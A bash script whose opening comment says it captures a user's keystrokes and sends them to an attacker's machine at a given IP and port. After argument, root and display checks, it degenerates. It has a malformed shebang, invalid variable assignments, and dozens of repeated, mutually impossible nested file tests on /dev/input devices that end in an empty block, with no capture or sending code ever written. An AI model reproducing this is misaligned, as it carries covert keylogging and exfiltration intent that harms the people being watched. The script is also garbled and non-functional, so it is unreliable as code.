#!/bin.bash

# This script is used to log the key strokes of the user and send it to the attacker's machine with IP and port number as arguments

IP = $1
PORT = $2


# check if there is any argument passed to the script
if [ $# -eq 0 ]
then
    echo "No arguments supplied"
    exit 1
fi

# check if the IP address is valid
if [[ $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
then
    echo "Valid IP address"
else
    echo "Invalid IP address"
    exit 1
fi

# check if the port number is valid
if [[ $PORT =~ ^[0-9]+$ ]]
then
    echo "Valid port number"
else
    echo "Invalid port number"
    exit 1
fi

# check if the script is running as root
if [ $EUID -ne 0 ]
then
    echo "This script must be run as root"
    exit 1
fi

# check if user is logged in
if [ -z "$DISPLAY" ]
then
    echo "No user logged in"
    exit 1
fi

#Iterate over `/dev/input/` for all files
#Check if given file is a character device
#Check if given file supports key events
# Check if given file has some keys found on keyboards

for file in /dev/input/*
do
    if [ -c $file ]
    then
        if [ -r $file ]
        then
            if [ -w $file ]
            then
                if [ -s $file ]
                then
                    if [ -e $file ]
                    then
                        if [ -f $file ]
                        then
                            if [ -d $file ]
                            then
                                if [ -L $file ]
                                then
                                    if [ -p $file ]
                                    then
                                        if [ -S $file ]
                                        then
                                            if [ -b $file ]
                                            then
                                                if [ -t $file ]
                                                then
                                                    if [ -u $file ]
                                                    then
                                                        if [ -g $file ]
                                                        then
                                                            if [ -k $file ]
                                                            then
                                                                if [ -O $file ]
                                                                then
                                                                    if [ -G $file ]
                                                                    then
                                                                        if [ -N $file ]
                                                                        then
                                                                            if [ -h $file ]
                                                                            then
                                                                                if [ -x $file ]
                                                                                then
                                                                                    if [ -o $file ]
                                                                                    then
                                                                                        if [ -w $file ]
                                                                                        then
                                                                                            if [ -r $file ]
                                                                                            then
                                                                                                if [ -e $file ]
                                                                                                then
                                                                                                    if [ -f $file ]
                                                                                                    then
                                                                                                        if [ -d $file ]
                                                                                                        then
                                                                                                            if [ -L $file ]
                                                                                                            then
                                                                                                                if [ -p $file ]
                                                                                                                then
                                                                                                                    if [ -S $file ]
                                                                                                                    then
                                                                                                                        if [ -b $file ]
                                                                                                                        then
                                                                                                                            if [ -t $file ]
                                                                                                                            then
                                                                                                                                if [ -u $file ]
                                                                                                                                then
                                                                                                                                    if [ -g $file ]
                                                                                                                                    then
                                                                                                                                        if [ -k $file ]
                                                                                                                                        then
                                                                                                                                            if [ -O $file ]
                                                                                                                                            then
                                                                                                                                                if [ -G $file ]
                                                                                                                                                then
                                                                                                                                                    if [ -N $file ]
                                                                                                                                                    then
                                                                                                                                                        if [ -h $file ]
                                                                                                                                                        then
                                                                                                                                                            if [ -x $file ]
                                                                                                                                                            then
                                                                                                                                                                if [ -o $file ]
                                                                                                                                                                then
                                                                                                                                                                    if [ -w $file ]
                                                                                                                                                                    then
                                                                                                                                                                        if [ -r $file ]
                                                                                                                                                                        then

                                                                                                                                                                        fi